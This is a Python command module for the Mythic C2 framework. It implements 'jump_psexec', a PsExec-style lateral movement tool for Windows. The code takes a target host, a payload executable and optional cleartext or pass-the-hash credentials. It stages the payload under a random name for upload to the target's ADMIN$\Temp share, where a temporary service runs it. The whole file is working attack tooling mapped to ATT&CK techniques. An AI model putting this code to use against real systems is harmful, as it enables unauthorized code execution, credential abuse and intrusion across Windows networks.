import base64
import random
import string
from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *


class JumpPsexecArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="target",
                cli_name="Target",
                display_name="Target",
                type=ParameterType.String,
                description="Hostname or IP address of the remote target.",
                parameter_group_info=[
                    ParameterGroupInfo(required=True, ui_position=1)
                ]
            ),
            CommandParameter(
                name="payload",
                cli_name="Payload",
                display_name="Payload",
                type=ParameterType.File,
                description="Executable to upload and run on the remote host.",
                parameter_group_info=[
                    ParameterGroupInfo(required=True, ui_position=2)
                ]
            ),
            CommandParameter(
                name="command",
                cli_name="Command",
                display_name="Extra Arguments",
                type=ParameterType.String,
                description="Optional arguments to append to the executed binary path.",
                default_value="",
                parameter_group_info=[
                    ParameterGroupInfo(required=False, ui_position=3)
                ]
            ),
            CommandParameter(
                name="service_name",
                cli_name="ServiceName",
                display_name="Service Name",
                type=ParameterType.String,
                description="Name of the temporary service to create. Leave blank for a random name.",
                default_value="",
                parameter_group_info=[
                    ParameterGroupInfo(required=False, ui_position=4)
                ]
            ),
            CommandParameter(
                name="username",
                cli_name="Username",
                display_name="Username",
                type=ParameterType.String,
                description="Optional: DOMAIN\\\\User for explicit authentication (cleartext or pass-the-hash).",
                default_value="",
                parameter_group_info=[
                    ParameterGroupInfo(required=False, ui_position=5)
                ]
            ),
            CommandParameter(
                name="password",
                cli_name="Password",
                display_name="Password",
                type=ParameterType.String,
                description="Optional: cleartext password for the specified user.",
                default_value="",
                parameter_group_info=[
                    ParameterGroupInfo(required=False, ui_position=6)
                ]
            ),
            CommandParameter(
                name="hash",
                cli_name="Hash",
                display_name="NT Hash",
                type=ParameterType.String,
                description="Optional: NT hash (hex) for pass-the-hash authentication. Supply instead of Password.",
                default_value="",
                parameter_group_info=[
                    ParameterGroupInfo(required=False, ui_position=7)
                ]
            ),
        ]

    async def parse_arguments(self):
        raise ValueError("Must use the modal or supply named arguments")

    async def parse_dictionary(self, dictionary_arguments):
        self.load_args_from_dictionary(dictionary_arguments)


class JumpPsexecCommand(CommandBase):
    cmd = "jump_psexec"
    needs_admin = True
    help_cmd = "jump_psexec -Target <host> -Payload <file> [-Command <extra args>] [-ServiceName <name>] [-Username DOMAIN\\user] [-Password pass | -Hash NTHASH]"
    description = (
        "Lateral movement via Windows Service Control Manager (SCM). "
        "Uploads a payload to the remote host's ADMIN$\\Temp share under a random 10-character name, "
        "creates a temporary service that executes it directly, starts the service, then deletes the service. "
        "Optionally authenticate with explicit credentials or an NT hash (pass-the-hash). "
        "Requires admin rights on the target host."
    )
    version = 1
    author = "@Lavender-exe"
    attackmapping = ["T1021.002", "T1569.002"]
    argument_class = JumpPsexecArguments
    attributes = CommandAttributes(
        builtin=False,
        supported_os=[SupportedOS.Windows],
        suggested_command=False,
    )

    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )
        try:
            target  = taskData.args.get_arg("target")
            file_id = taskData.args.get_arg("payload")
            password = taskData.args.get_arg("password") or ""
            hash_val = taskData.args.get_arg("hash") or ""

            if password and hash_val:
                raise Exception("Supply either Password or Hash, not both.")

            file_resp = await SendMythicRPCFileGetContent(
                MythicRPCFileGetContentMessage(AgentFileId=file_id)
            )
            if not file_resp.Success:
                raise Exception("Failed to fetch payload from Mythic: " + file_resp.Error)

            rand_name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10)) + ".exe"

            taskData.args.remove_arg("payload")
            taskData.args.add_arg("file_name", rand_name)
            taskData.args.add_arg("payload_data", base64.b64encode(file_resp.Content).decode("utf-8"))

            auth_note = ""
            username = taskData.args.get_arg("username") or ""
            if hash_val and username:
                auth_note = f" [PTH: {username}]"
            elif password and username:
                auth_note = f" [creds: {username}]"

            response.DisplayParams = f"{target} -> \\\\{target}\\ADMIN$\\Temp\\{rand_name}{auth_note}"
        except Exception as e:
            raise Exception(str(e))
        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        return resp
